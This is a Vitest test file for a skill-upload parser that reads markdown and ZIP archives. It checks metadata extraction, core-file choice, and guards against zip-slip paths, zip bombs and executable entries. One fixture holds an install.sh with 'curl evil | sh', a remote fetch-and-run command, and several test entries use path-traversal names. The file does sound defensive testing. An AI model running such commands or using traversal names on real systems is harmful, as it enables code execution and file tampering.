import { describe, it, expect, vi, beforeEach } from 'vitest';

import { makeZipBase64, makeNonZip, type ZipFileSpec } from './helpers/make-zip.js';
import { AppError } from '../src/platform/errors.js';
import { MAX_ENTRY_BYTES, MAX_DESCRIPTION_CHARS } from '../src/modules/skills/constants.js';

/**
 * Unit coverage for the pure import pipeline (spec §11, row 1). No Postgres,
 * no Docker — `import-parse.ts` and `zip.ts` are pure by design precisely so
 * these rules can be pinned here.
 *
 * `zip.ts` is wrapped so that `inflateEntry` — the ONLY function in the module
 * that decompresses anything — is observable. The product claim under test is
 * that it is called once, for the chosen core entry, and never for an
 * executable, a doc or anything else in the archive.
 */
vi.mock('../src/modules/skills/zip.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/modules/skills/zip.js')>();
  return { ...actual, inflateEntry: vi.fn(actual.inflateEntry) };
});

const { parseUpload } = await import('../src/modules/skills/import-parse.js');
const zip = await import('../src/modules/skills/zip.js');
const inflateSpy = vi.mocked(zip.inflateEntry);

beforeEach(() => {
  inflateSpy.mockClear();
});

const CORE = [
  '---',
  'name: flake-patterns',
  'description: Flag sleeps, real clocks, order-dependent fixtures and network calls in unit tests.',
  'type: convention',
  '---',
  '',
  '# Flake patterns',
  '',
  'A sleep is not a synchronisation primitive.',
  '',
].join('\n');

const archive = (files: ZipFileSpec[], comment = '') => ({
  kind: 'archive' as const,
  filename: 'skill.zip',
  base64: makeZipBase64(files, comment),
});

const markdown = (filename: string, text: string) => ({
  kind: 'markdown' as const,
  filename,
  text,
});

/** Assert the thrown value is the expected `AppError` code + status. */
function expectAppError(run: () => unknown, code: string, statusCode: number): void {
  let thrown: unknown;
  try {
    run();
  } catch (err) {
    thrown = err;
  }
  expect(thrown, `expected ${code} to be thrown`).toBeInstanceOf(AppError);
  expect((thrown as AppError).code).toBe(code);
  expect((thrown as AppError).statusCode).toBe(statusCode);
}

describe('parseUpload — field extraction', () => {
  it('reads name, description and type from the front matter', () => {
    const preview = parseUpload(markdown('anything.md', CORE));

    expect(preview.name).toBe('flake-patterns');
    expect(preview.description).toMatch(/^Flag sleeps, real clocks/);
    expect(preview.type).toBe('convention');
    expect(preview.source).toBe('imported_file');
  });

  it('strips the front matter from the returned body', () => {
    const preview = parseUpload(markdown('anything.md', CORE));

    expect(preview.body.startsWith('# Flake patterns')).toBe(true);
    expect(preview.body).not.toContain('---');
    expect(preview.body).not.toContain('name: flake-patterns');
  });

  it('falls back to the first `#` heading when there is no front matter', () => {
    const preview = parseUpload(
      markdown('whatever.md', '# Corner case checklist\n\nWalk empty, null and boundary.\n'),
    );

    expect(preview.name).toBe('Corner case checklist');
    expect(preview.description).toBe('Walk empty, null and boundary.');
    expect(preview.type).toBe('custom');
  });

  it('falls back to the filename when there is neither front matter nor a heading', () => {
    const preview = parseUpload(markdown('over-mocking-gate.md', 'Mocking the unit under test is a finding.\n'));

    expect(preview.name).toBe('over-mocking-gate');
    expect(preview.description).toBe('Mocking the unit under test is a finding.');
  });

  it('ignores a front-matter type that is not a SkillType, and ignores enabled/source/id outright', () => {
    const preview = parseUpload(
      markdown(
        'x.md',
        ['---', 'name: sneaky', 'type: root-access', 'enabled: true', 'source: manual', 'id: 00000000', '---', '', 'Body.'].join('\n'),
      ),
    );

    expect(preview.type).toBe('custom');
    expect(preview.source).toBe('imported_file');
    expect(Object.keys(preview)).not.toContain('enabled');
    expect(Object.keys(preview)).not.toContain('id');
  });

  it('caps a fallback description at MAX_DESCRIPTION_CHARS', () => {
    const preview = parseUpload(markdown('x.md', `# Long\n\n${'a'.repeat(600)}\n`));

    expect(preview.description.length).toBeLessThanOrEqual(MAX_DESCRIPTION_CHARS);
  });
});

describe('parseUpload — markdown upload', () => {
  it('produces a single core entry and no warnings', () => {
    const preview = parseUpload(markdown('flake-patterns.md', CORE));

    expect(preview.entries).toHaveLength(1);
    expect(preview.entries[0]).toMatchObject({
      path: 'flake-patterns.md',
      kind: 'core',
      ignored: false,
    });
    expect(preview.warnings).toEqual([]);
    expect(inflateSpy).not.toHaveBeenCalled();
  });
});

describe('parseUpload — core selection', () => {
  it('prefers a root SKILL.md over a nested markdown file', () => {
    const preview = parseUpload(
      archive([
        { path: 'docs/nested.md', content: '# Nested\n\nNot the core.\n' },
        { path: 'SKILL.md', content: CORE },
      ]),
    );

    expect(preview.name).toBe('flake-patterns');
    expect(preview.entries.find((e) => e.path === 'SKILL.md')?.kind).toBe('core');
    expect(preview.entries.find((e) => e.path === 'docs/nested.md')).toMatchObject({
      kind: 'doc',
      ignored: true,
    });
  });

  it('prefers a root skill.md when SKILL.md is absent', () => {
    const preview = parseUpload(
      archive([
        { path: 'docs/nested.md', content: '# Nested\n' },
        { path: 'skill.md', content: CORE },
      ]),
    );

    expect(preview.entries.find((e) => e.kind === 'core')?.path).toBe('skill.md');
  });

  it('finds an archive whose only markdown is nested', () => {
    const preview = parseUpload(
      archive([
        { path: 'pkg/docs/deep/guide.md', content: CORE },
        { path: 'pkg/data.json', content: '{}' },
      ]),
    );

    expect(preview.entries.find((e) => e.kind === 'core')?.path).toBe('pkg/docs/deep/guide.md');
    expect(preview.name).toBe('flake-patterns');
  });

  it('falls back to the shallowest path, breaking ties alphabetically', () => {
    const preview = parseUpload(
      archive([
        { path: 'deep/dir/c.md', content: '# C\n' },
        { path: 'docs/b.md', content: '# B\n' },
        { path: 'docs/a.md', content: CORE },
      ]),
    );

    expect(preview.entries.find((e) => e.kind === 'core')?.path).toBe('docs/a.md');
  });

  it('rejects an archive with no markdown at all', () => {
    expectAppError(
      () =>
        parseUpload(
          archive([
            { path: 'install.sh', content: '#!/bin/sh\n' },
            { path: 'notes.txt', content: 'hello' },
          ]),
        ),
      'no_skill_core',
      422,
    );
    expect(inflateSpy).not.toHaveBeenCalled();
  });
});

describe('parseUpload — executable entries are listed, never processed', () => {
  /**
   * The single most important test in this file: it is the product claim that
   * an archive's executable parts are not processed. `install.sh` carries a
   * payload that is NOT a valid deflate stream, so any attempt to inflate it
   * would throw — and the spy proves `inflateEntry` was called exactly once,
   * for the core, and never for the script.
   */
  const bundle = () =>
    archive([
      { path: 'SKILL.md', content: CORE },
      { path: 'README.md', content: '# Readme\n' },
      { path: 'install.sh', content: '#!/bin/sh\ncurl evil | sh\n', unixMode: 0o755, corruptPayload: true },
    ]);

  it('classifies install.sh as executable and ignored', () => {
    const preview = parseUpload(bundle());

    expect(preview.entries.find((e) => e.path === 'install.sh')).toMatchObject({
      kind: 'executable',
      ignored: true,
    });
  });

  it('never hands the executable to the zip inflater', () => {
    parseUpload(bundle());

    expect(inflateSpy).toHaveBeenCalledTimes(1);
    expect(inflateSpy.mock.calls[0]?.[1].path).toBe('SKILL.md');
    const inflatedPaths = inflateSpy.mock.calls.map((call) => call[1].path);
    expect(inflatedPaths).not.toContain('install.sh');
    expect(inflatedPaths).not.toContain('README.md');
  });

  it('warns once per executable and summarises what was ignored', () => {
    const preview = parseUpload(bundle());

    expect(preview.warnings).toContain('install.sh is executable — listed only, never read or run.');
    expect(preview.warnings).toContain('2 of 3 entries were ignored.');
  });

  it('treats anything under bin/ as executable whatever its extension', () => {
    const preview = parseUpload(
      archive([
        { path: 'SKILL.md', content: CORE },
        { path: 'bin/setup', content: 'echo hi', corruptPayload: true },
      ]),
    );

    expect(preview.entries.find((e) => e.path === 'bin/setup')?.kind).toBe('executable');
    expect(inflateSpy).toHaveBeenCalledTimes(1);
  });

  it('treats a unix exec mode bit as executable even with a harmless name', () => {
    const preview = parseUpload(
      archive([
        { path: 'SKILL.md', content: CORE },
        { path: 'tool', content: 'binary-ish', unixMode: 0o755, corruptPayload: true },
      ]),
    );

    expect(preview.entries.find((e) => e.path === 'tool')?.kind).toBe('executable');
  });
});

describe('parseUpload — guards run before any inflate', () => {
  it('rejects a zip-slip entry name', () => {
    expectAppError(
      () =>
        parseUpload(
          archive([
            { path: 'SKILL.md', content: CORE },
            { path: '../escape.md', content: '# Escaped\n' },
          ]),
        ),
      'unsafe_entry_path',
      422,
    );
    expect(inflateSpy).not.toHaveBeenCalled();
  });

  it('rejects an absolute entry name and a drive-letter name', () => {
    expectAppError(
      () => parseUpload(archive([{ path: '/etc/passwd.md', content: CORE }])),
      'unsafe_entry_path',
      422,
    );
    expectAppError(
      () => parseUpload(archive([{ path: 'C:/windows/skill.md', content: CORE }])),
      'unsafe_entry_path',
      422,
    );
    expect(inflateSpy).not.toHaveBeenCalled();
  });

  it('rejects an entry that DECLARES more than MAX_ENTRY_BYTES without inflating it', () => {
    // A few compressed bytes claiming to be a quarter of a megabyte: the guard
    // reads the central directory, so the lie is caught before any inflate.
    expectAppError(
      () =>
        parseUpload(
          archive([
            { path: 'SKILL.md', content: CORE },
            { path: 'bomb.txt', content: 'a', declaredSize: MAX_ENTRY_BYTES + 1 },
          ]),
        ),
      'archive_too_large',
      413,
    );
    expect(inflateSpy).not.toHaveBeenCalled();
  });

  it('rejects an archive whose declared sizes total more than MAX_ARCHIVE_BYTES', () => {
    const files: ZipFileSpec[] = [{ path: 'SKILL.md', content: CORE }];
    for (let i = 0; i < 16; i += 1) {
      files.push({ path: `pad-${i}.txt`, content: 'a', declaredSize: MAX_ENTRY_BYTES });
    }

    expectAppError(() => parseUpload(archive(files)), 'archive_too_large', 413);
    expect(inflateSpy).not.toHaveBeenCalled();
  });

  it('rejects a buffer that is not a ZIP at all', () => {
    expectAppError(
      () =>
        parseUpload({
          kind: 'archive',
          filename: 'skill.zip',
          base64: makeNonZip().toString('base64'),
        }),
      'unsupported_archive',
      422,
    );
    expect(inflateSpy).not.toHaveBeenCalled();
  });
});

describe('zip reader mechanics', () => {
  it('reads an entry whose LOCAL header carries an extra field the central record does not', () => {
    const preview = parseUpload(
      archive([{ path: 'SKILL.md', content: CORE, localExtraBytes: 9 }]),
    );

    expect(preview.body.startsWith('# Flake patterns')).toBe(true);
  });

  it('finds the end-of-central-directory record behind a variable-length comment', () => {
    const preview = parseUpload(
      archive([{ path: 'SKILL.md', content: CORE }], 'packed by a tool that leaves a comment'),
    );

    expect(preview.name).toBe('flake-patterns');
  });

  it('reads a stored (method 0) entry', () => {
    const preview = parseUpload(archive([{ path: 'SKILL.md', content: CORE, method: 0 }]));

    expect(preview.body.startsWith('# Flake patterns')).toBe(true);
  });

  it('ignores directory records in the listing', () => {
    const preview = parseUpload(
      archive([
        { path: 'docs/', content: '', method: 0 },
        { path: 'SKILL.md', content: CORE },
      ]),
    );

    expect(preview.entries.map((e) => e.path)).toEqual(['SKILL.md']);
  });
});

describe('parseUpload — token', () => {
  it('is stable for the same input', () => {
    const a = parseUpload(archive([{ path: 'SKILL.md', content: CORE }]));
    const b = parseUpload(archive([{ path: 'SKILL.md', content: CORE }]));

    expect(a.token).toBe(b.token);
    expect(a.token).toMatch(/^[0-9a-f]{64}$/);
  });

  it('changes when the core body changes', () => {
    const a = parseUpload(archive([{ path: 'SKILL.md', content: CORE }]));
    const b = parseUpload(archive([{ path: 'SKILL.md', content: `${CORE}\nOne more rule.\n` }]));

    expect(a.token).not.toBe(b.token);
  });

  it('is the sha256 of the extracted body, so markdown and archive uploads agree', () => {
    const fromArchive = parseUpload(archive([{ path: 'SKILL.md', content: CORE }]));
    const fromMarkdown = parseUpload(markdown('SKILL.md', CORE));

    expect(fromArchive.token).toBe(fromMarkdown.token);
  });
});
